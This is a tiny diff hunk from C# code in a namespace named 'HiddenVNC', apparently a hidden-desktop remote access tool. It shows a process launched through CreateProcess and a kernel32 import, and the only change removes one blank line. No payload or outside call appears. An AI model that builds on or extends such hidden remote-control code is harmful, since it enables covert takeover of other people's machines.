@@ -737,7 +737,6 @@ namespace HiddenVNC
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                 bool result = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref si, out pi);
             }).Wait();
-
         }
 
         [DllImport("kernel32.dll")]
